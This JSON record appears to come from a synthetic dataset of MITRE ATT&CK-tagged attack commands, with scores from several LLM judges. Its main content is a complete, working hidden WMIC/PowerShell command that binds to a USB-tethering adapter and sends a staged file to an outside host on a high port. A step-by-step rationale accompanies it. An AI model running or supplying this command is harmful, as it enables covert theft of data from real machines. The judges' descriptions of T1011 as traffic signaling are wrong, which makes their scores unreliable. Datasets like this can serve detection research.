{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Uses WMIC to invoke PowerShell that binds to a USB tethering (Remote NDIS) adapter and exfiltrates a file to an external host using a high TCP port. This exploits a USB-backed network path distinct from the primary NIC.",
  "rationale_steps": [
    "Detect a USB tethering NIC via its Remote NDIS description.",
    "Bind the TCP client to that interface to force egress over USB tether.",
    "Connect to an uncommon port on the exfiltration server.",
    "Send the selected file over the alternate network medium per T1011.",
    "Refrain from system-level network configuration changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-e65af2df",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 4,
        "syntactic_justification": "Overall well-formed WMIC/PowerShell invocation with balanced quoting and separators, though the backticks before $ are unnecessary and could be brittle across environments.",
        "semantic_score": 1,
        "semantic_justification": "This performs straightforward file exfiltration over a TCP connection (via a specific NIC) rather than embedding signals/covert cues in legitimate-looking traffic as required by T1011.",
        "combined_score": 2.5,
        "confidence": 0.7,
        "timestamp": "2025-10-01T15:37:03.089240Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with all PowerShell variables correctly escaped using backticks within the WMIC double-quoted string, ensuring proper parsing and execution.",
        "semantic_score": 2,
        "semantic_justification": "While the command effectively exfiltrates a file over a specific network adapter, this direct data transfer using a standard TCP connection does not align well with T1011's focus on embedding signals or commands covertly within legitimate traffic or using subtle channel characteristics.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T15:37:26.044909Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax including variable declarations, method calls, and pipeline operations.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by using a specific network adapter (Remote NDIS/USB tethering) as a covert channel to exfiltrate data to a command and control server on a high port, bypassing potential monitoring on primary network interfaces.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:14:06.103551Z"
      }
    ],
    "llm_average_syntactic": 4.667,
    "llm_average_semantic": 2.667,
    "llm_average_score": 3.667,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}